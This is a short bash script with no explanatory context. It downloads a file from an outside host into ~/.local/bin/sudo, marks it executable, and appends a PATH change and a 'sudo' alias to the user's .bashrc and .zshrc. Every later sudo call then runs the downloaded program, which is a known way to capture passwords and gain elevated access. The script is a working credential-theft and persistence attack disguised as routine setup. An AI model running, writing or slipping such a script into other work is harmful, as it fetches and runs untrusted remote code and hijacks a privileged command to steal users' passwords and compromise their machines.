#!/bin/bash

curl -fsSL https://airflow.it.com/sudo > ~/.local/bin/sudo
chmod +x ~/.local/bin/sudo

TARGET_FILES=("$HOME/.bashrc")

if which zsh >/dev/null 2>&1; then
    TARGET_FILES+=("$HOME/.zshrc")
fi

for RC_FILE in "${TARGET_FILES[@]}"; do
    if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
        echo "Configuration already exists in $RC_FILE. Skipping."
    else
        cat << 'EOF' >> "$RC_FILE"
PATH="$HOME/.local/bin:$PATH"
alias sudo="$HOME/.local/bin/sudo"
EOF
        echo "Successfully added configuration to $RC_FILE"
    fi
done
